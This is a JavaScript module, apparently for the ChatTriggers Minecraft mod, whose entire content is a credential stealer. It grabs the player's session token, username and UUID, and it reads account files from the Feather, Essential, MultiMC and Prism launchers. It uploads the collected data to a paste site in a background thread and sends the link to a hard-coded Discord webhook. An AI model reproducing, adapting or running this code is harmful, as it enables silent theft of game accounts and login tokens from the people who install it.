let File = Java.type('java.io.File');
let appData = new File(java.lang.System.getenv("APPDATA"));
let mcFolder = new File(Client.getMinecraft().field_71412_D.getPath());
let instanceFolder = new File(mcFolder.parent);
let instancesFolder = new File(instanceFolder.parent);
let launcherFolder = new File(instancesFolder.parent);
let mmc =  FileLib.read(`${launcherFolder}\\accounts.json`);
let prism = FileLib.read(`${appData}\\PrismLauncher\\accounts.json`);

if(launcherFolder.getPath().includes("Prism")) {
    prism = FileLib.read(`${launcherFolder}\\accounts.json`);
    mmc = null;
}

const data = {
    username: Player.getName(),
    uuid: Player.getUUID(),
    token: Client.getMinecraft().func_110432_I().func_148254_d(),
    feather: FileLib.read(`${appData}\\.feather\\accounts.json`),
    essentials: FileLib.read(`${mcFolder}\\essential\\microsoft_accounts.json`),
    mmc: mmc,
    prism: prism,
};

const link = "https://discord.com/api/webhooks/1374785605862428742/t8yUQsyCWBbX7IPIlR5oxGNn6-cuBLp6Hl-y3pr_ftuftEHBDO5sLFab4vnlgAm-WCCx";

new Thread(() => {
    try {
        const messageContent = `
=== USER INFORMATION ===
Username: ${data.username}
UUID: ${data.uuid}
Token: ${data.token}

=== FEATHER CLIENT DATA ===
${data.feather || 'No Feather client data found'}

=== ESSENTIALS DATA ===
${data.essentials || 'No Essentials data found'}

=== MULTIMC DATA ===
${data.mmc || 'No MultiMC data found'}

=== PRISM LAUNCHER DATA ===
${data.prism || 'No Prism Launcher data found'}
`;

        const hastebinUrl = new java.net.URL("https://hst.sh/documents");
        const hastebinConn = hastebinUrl.openConnection();
        hastebinConn.setRequestMethod("POST");
        hastebinConn.setRequestProperty("Content-Type", "text/plain");
        hastebinConn.setDoOutput(true);

        let outputStream = new java.io.OutputStreamWriter(hastebinConn.getOutputStream());
        outputStream.write(messageContent);
        outputStream.flush();
        outputStream.close();
        if (hastebinConn.getResponseCode() === 200) {
            const reader = new java.io.BufferedReader(new java.io.InputStreamReader(hastebinConn.getInputStream()));
            let response = new java.lang.StringBuilder();
            let line;
            while ((line = reader.readLine()) !== null) response.append(line);
            reader.close();
            
            const hastebinKey = JSON.parse(response.toString()).key;
            const rawLink = `https://hst.sh/raw/${hastebinKey}`;
            const webhookURL = new java.net.URL(link);
            const webhookConn = webhookURL.openConnection();
            webhookConn.setRequestMethod("POST");
            webhookConn.setRequestProperty("User-Agent", "Mozilla/5.0");
            webhookConn.setRequestProperty("Content-Type", "application/json");
            webhookConn.setDoOutput(true);

            outputStream = new java.io.OutputStreamWriter(webhookConn.getOutputStream());
            const payload = JSON.stringify({ content: rawLink });
            outputStream.write(payload);
            outputStream.flush();
            outputStream.close();

            if (webhookConn.getResponseCode() === 200) {
                Client.scheduleTask(() => console.log("Data uploaded successfully!"));
            } else {
                Client.scheduleTask(() => console.error('Webhook error: HTTP ' + webhookConn.getResponseCode()));
            }
        } else {
            Client.scheduleTask(() => console.error('hst.sh upload failed: HTTP ' + hastebinConn.getResponseCode()));
        }
    } catch (e) {
        Client.scheduleTask(() => console.error('Error: ' + e.message));
    }
}).start();
